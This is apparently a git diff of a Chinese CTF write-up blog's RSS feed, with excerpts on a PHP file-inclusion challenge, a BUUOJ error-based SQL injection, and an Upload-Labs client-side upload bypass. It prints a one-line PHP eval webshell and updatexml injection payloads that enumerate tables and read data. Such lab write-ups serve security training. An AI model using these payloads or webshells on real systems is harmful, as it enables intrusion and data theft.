+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;); &lt;span style="color:#75715e"&gt;// 关闭报错显示
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])) { &lt;span style="color:#75715e"&gt;// 接收 file 参数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strpos&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;], &lt;span style="color:#e6db74"&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) { &lt;span style="color:#75715e"&gt;// 如果包含 &amp;#34;flag&amp;#34; 字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;hack&amp;#34;&lt;/span&gt;; &lt;span style="color:#75715e"&gt;// 输出 hack，阻止访问
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;include&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]); &lt;span style="color:#75715e"&gt;// 否则包含指定文件
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="逻辑梳理"&gt;逻辑梳理&lt;/h3&gt;
 &lt;table&gt;
 	&lt;thead&gt;
 			&lt;tr&gt;
@@ -233,26 +263,19 @@
 &lt;/table&gt;
 &lt;p&gt;&lt;strong&gt;核心考点&lt;/strong&gt;：&lt;code&gt;include()&lt;/code&gt; 函数的特性——&lt;strong&gt;不检查后缀，直接执行文件中的 PHP 代码&lt;/strong&gt;。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;三发现突破口&#34;&gt;三、发现突破口&lt;/h2&gt;
+&lt;h2 id="三发现突破口"&gt;三、发现突破口&lt;/h2&gt;
 &lt;p&gt;题目下方有一个提示链接，访问后得到 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://&amp;lt;TARGET_IP&amp;gt;:&amp;lt;PORT&amp;gt;/shell.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;内容是一句话木马：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;($_REQUEST[&lt;span style="color:#e6db74"&gt;&amp;#39;ctfhub&amp;#39;&lt;/span&gt;]);&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;连接密码&lt;/strong&gt;：&lt;code&gt;ctfhub&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST[&#39;ctfhub&#39;]&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;code&gt;eval()&lt;/code&gt; 函数将 &lt;code&gt;$_REQUEST['ctfhub']&lt;/code&gt; 接收到的内容作为 PHP 代码执行&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;四解题思路&#34;&gt;四、解题思路&lt;/h2&gt;
-&lt;h3 id=&#34;41-include-函数的关键特性&#34;&gt;4.1 include 函数的关键特性&lt;/h3&gt;
-&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>[BUUOJ] SQL COURSE 1</title>
-      <link>https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/</link>
-      <pubDate>Mon, 01 Jun 2026 22:00:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/buu-sql-course-1/</guid>
-      <description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;
+&lt;h2 id="四解题思路"&gt;四、解题思路&lt;/h2&gt;
+&lt;h3 id="41-include-函数的关键特性"&gt;4.1 include 函数的关键特性&lt;/h3&gt;
+&lt;p&gt;假设 &lt;code&gt;index.php&lt;/code&gt; 中执行了：&lt;/p&gt;</description></item><item><title>[BUUOJ] SQL COURSE 1</title><link>https://Samantha09.github.io/san-blog/posts/buuoj-sql-course-1/</link><pubDate>Mon, 01 Jun 2026 22:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/buuoj-sql-course-1/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / SQL 注入&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：BUUOJ&lt;/li&gt;
@@ -260,36 +283,29 @@
 &lt;li&gt;&lt;strong&gt;目标&lt;/strong&gt;：通过报错注入读取数据库中的 flag&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
 &lt;p&gt;页面存在 SQL 注入点，输入单引号后数据库返回报错信息。通过 &lt;code&gt;updatexml()&lt;/code&gt; 函数构造报错，可以将查询结果带出。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;利用步骤&#34;&gt;利用步骤&lt;/h2&gt;
-&lt;h3 id=&#34;1-确认报错注入&#34;&gt;1. 确认报错注入&lt;/h3&gt;
+&lt;h2 id="利用步骤"&gt;利用步骤&lt;/h2&gt;
+&lt;h3 id="1-确认报错注入"&gt;1. 确认报错注入&lt;/h3&gt;
 &lt;p&gt;构造 payload 测试报错注入是否可行：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;确认报错注入&#34; loading=&#34;lazy&#34; src=&#34;../../images/buu-sql-course-1/step1-error-based-sql.png&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step1-error-based-sql.png" alt="确认报错注入"&gt;&lt;/p&gt;
 &lt;p&gt;回显中出现 &lt;code&gt;~geek~&lt;/code&gt;，确认当前数据库名为 &lt;code&gt;geek&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;2-查表名&#34;&gt;2. 查表名&lt;/h3&gt;
+&lt;h3 id="2-查表名"&gt;2. 查表名&lt;/h3&gt;
 &lt;p&gt;从 &lt;code&gt;information_schema.tables&lt;/code&gt; 中查询当前库的所有表名：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;查询表名&#34; loading=&#34;lazy&#34; src=&#34;../../images/buu-sql-course-1/step2-table-name.png&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;3-查列名&#34;&gt;3. 查列名&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step2-table-name.png" alt="查询表名"&gt;&lt;/p&gt;
+&lt;h3 id="3-查列名"&gt;3. 查列名&lt;/h3&gt;
 &lt;p&gt;锁定目标表后，查询表中的列名：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;目标表名&amp;#39;),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;查询列名&#34; loading=&#34;lazy&#34; src=&#34;../../images/buu-sql-course-1/step3-column-name.png&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;4-读取-flag&#34;&gt;4. 读取 flag&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;目标表名&amp;#39;),0x7e),1)%23
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step3-column-name.png" alt="查询列名"&gt;&lt;/p&gt;
+&lt;h3 id="4-读取-flag"&gt;4. 读取 flag&lt;/h3&gt;
 &lt;p&gt;拿到列名后，直接查询 flag 字段：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;读取 flag&#34; loading=&#34;lazy&#34; src=&#34;../../images/buu-sql-course-1/step4-get-flag.png&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;id=1&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(flag) from 目标表名),0x7e),1)%23
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../images/buu-sql-course-1/step4-get-flag.png" alt="读取 flag"&gt;&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;updatexml&lt;/code&gt; 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 &lt;code&gt;substr()&lt;/code&gt; 分段读取。&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>[DASCTF] Upload-Labs-Linux Pass-01</title>
-      <link>https://Samantha09.github.io/san-blog/posts/upload-labs-linux-pass01/</link>
-      <pubDate>Mon, 01 Jun 2026 21:00:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/upload-labs-linux-pass01/</guid>
-      <description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;updatexml&lt;/code&gt; 的报错输出有长度限制（约 32 字符），如果 flag 较长，需要用 &lt;code&gt;substr()&lt;/code&gt; 分段读取。&lt;/p&gt;</description></item><item><title>[DASCTF] Upload-Labs-Linux Pass-01</title><link>https://Samantha09.github.io/san-blog/posts/dasctf-upload-labs-linux-pass-01/</link><pubDate>Mon, 01 Jun 2026 21:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/dasctf-upload-labs-linux-pass-01/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / 文件上传漏洞&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：Upload-Labs（Pass-01）&lt;/li&gt;
@@ -297,50 +313,43 @@
 &lt;li&gt;&lt;strong&gt;目标&lt;/strong&gt;：上传 webshell 到服务器并执行命令获取 flag&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;靶机地址&#34;&gt;靶机地址&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://target/Pass-01/index.php
+&lt;h2 id="靶机地址"&gt;靶机地址&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://target/Pass-01/index.php
 &lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
-&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
-&lt;h3 id=&#34;1-前端校验&#34;&gt;1. 前端校验&lt;/h3&gt;
+&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
+&lt;h3 id="1-前端校验"&gt;1. 前端校验&lt;/h3&gt;
 &lt;p&gt;页面源码中的表单提交时触发 &lt;code&gt;checkFile()&lt;/code&gt; 函数：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;checkFile&lt;/span&gt;() {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementsByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 定义允许上传的文件类型
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allow_ext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 提取上传文件的类型
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ext_name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substring&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lastIndexOf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;));
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 判断上传文件类型是否允许上传
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;allow_ext&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ext_name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errMsg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allow_ext&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ext_name&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;errMsg&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkFile&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; document.&lt;span style="color:#a6e22e"&gt;getElementsByName&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;].&lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt; &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 定义允许上传的文件类型
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 提取上传文件的类型
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;substring&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;lastIndexOf&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 判断上传文件类型是否允许上传
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;indexOf&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;|&amp;#34;&lt;/span&gt;) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;var&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;allow_ext&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ext_name&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;alert&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;errMsg&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;关键点&lt;/strong&gt;：校验只存在于浏览器端 JavaScript，后端 PHP 未对文件类型、后缀、内容做任何校验。&lt;/p&gt;
-&lt;h3 id=&#34;2-绕过思路&#34;&gt;2. 绕过思路&lt;/h3&gt;
+&lt;h3 id="2-绕过思路"&gt;2. 绕过思路&lt;/h3&gt;
 &lt;p&gt;前端 JS 校验无法阻止直接构造 HTTP 请求。使用 &lt;code&gt;curl&lt;/code&gt; 命令直接发送 &lt;code&gt;multipart/form-data&lt;/code&gt; POST 请求，完全不经过浏览器页面，即可绕过前端拦截。&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;利用步骤&#34;&gt;利用步骤&lt;/h2&gt;
-&lt;h3 id=&#34;1-准备-webshell&#34;&gt;1. 准备 webshell&lt;/h3&gt;
-&lt;p&gt;编写一个最简单的 PHP webshell：&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>[0CTF 2016]piapiapia</title>
-      <link>https://Samantha09.github.io/san-blog/posts/piapiapia/</link>
